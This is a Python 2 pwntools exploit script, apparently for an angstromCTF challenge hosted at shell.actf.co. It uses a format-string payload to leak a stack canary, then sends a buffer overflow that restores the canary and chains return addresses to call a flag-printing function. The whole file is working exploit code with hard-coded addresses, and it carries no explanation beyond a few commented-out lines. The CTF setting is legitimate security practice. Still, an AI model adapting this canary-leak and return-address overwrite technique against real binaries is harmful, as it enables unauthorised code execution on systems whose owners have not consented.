# Import everything in the pwntools namespace
from pwn import *


context(os='linux', arch='amd64')

call_flag   = 0x400787
pop_rdi     = 0x400a33
got_addr    = 0x600c50
gets_addr   = 0x601fd8
canary_met  = 0x400630 

payload_leak = "A"*8 + "%p" * 30 

#payload_leak = p64(gets_addr) +  "%10000004$n"

#sh = process('./no_canary')
#sh.sendlineafter('name? ', payload)


conn = remote('shell.actf.co', 20701)
#conn = process('canary')

conn.recvuntil("name? ", timeout=2, drop=True)
conn.sendline(payload_leak)

#gdb.attach(conn)
data_leak = conn.recvuntil("me? ", timeout=2, drop=True)

print data_leak.split("0x")
#canary = data_leak.split("0x")[17]
canary      = data_leak.split("0x")[17]
secondary   = data_leak.split("0x")[18]
print "Found canary: {}".format(canary)
canary      = int('0x' + canary, 16)
secondary   = int('0x' + secondary, 16)

#print p64(canary)
#print p64(call_flag)
print "Creating payload..."

payload_fin = "B"*56 
payload_fin += p64(canary)
payload_fin += p64(secondary)

call_flag   = 0x0000000000400787
pop_rdi     = 0x0000000000400a33
#got_addr    = 0x0000000000600c50
#gets_addr   = 0x0000000000601fd8
#canary_met  = 0x0000000000400630 
main_ret    = 0x00000000004009d0
pop_rbp_ret = 0x0000000000400708

payload_fin += p64(pop_rbp_ret)
payload_fin += p64(main_ret)
payload_fin += p64(call_flag)

#gdb.attach(conn)
conn.sendline(payload_fin)


#print conn.recv()
print conn.recv()

#canary = 
#conn.interactive()